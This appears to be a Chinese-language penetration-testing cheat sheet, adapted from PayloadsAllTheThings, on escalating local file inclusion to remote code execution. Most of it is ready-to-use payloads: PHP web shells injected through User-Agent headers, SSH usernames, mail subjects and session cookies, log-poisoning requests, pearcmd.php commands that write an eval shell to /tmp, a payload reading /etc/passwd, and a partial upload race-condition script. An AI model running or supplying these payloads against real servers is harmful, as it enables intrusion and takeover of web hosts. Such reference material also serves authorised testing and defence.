# LFI to RCE - 本地文件包含到远程代码执行

[SEARCH_KEYWORDS]
漏洞类型: LFI to RCE Local File Inclusion to Remote Code Execution
攻击类型: Remote Code Execution File Inclusion Code Execution
关键词: LFI RCE proc/self log poisoning upload race condition
技术: Log Poisoning PHP Sessions Upload Race proc/self/environ PEARCMD
文件: /proc/self/environ /var/log/apache2/access.log PHPSESSID

[CONTENT]

## LFI to RCE概述

LFI到RCE是指将本地文件包含漏洞升级为远程代码执行。攻击者通过LFI漏洞包含恶意代码文件，最终实现任意代码执行。

## 攻击技术

### 通过/proc/*/fd

1. 上传大量shell文件
2. 包含`/proc/$PID/fd/$FD`

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

### 通过/proc/self/environ

在User-Agent头部注入payload：

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### 通过上传

注入shell到上传文件：

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

### 通过日志文件投毒

日志文件路径：

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail
```

**SSH日志投毒**：

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

**Apache日志投毒**：

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

**Mail日志投毒**：

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### 通过PHP Sessions

检查PHPSESSID cookie，包含session文件：

```powershell
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]
```

设置恶意cookie：

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

### 通过PHP PEARCMD

Docker PHP镜像默认安装`/usr/local/lib/php/pearcmd.php`

```ps1
# 方法1: config create
/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php

# 方法2: man_dir
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
```

### 通过上传竞争条件

```python
import itertools
import requests

for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
```

### Windows FindFirstFile

仅限Windows，使用通配符：

- `*`/`<<` : 任意字符序列
- `?`/`>` : 任意单个字符

```ps1
http://site/vuln.php?inc=c:\windows\temp\php<<
```

## 参考文档

原始来源: PayloadsAllTheThings/File Inclusion/LFI-to-RCE.md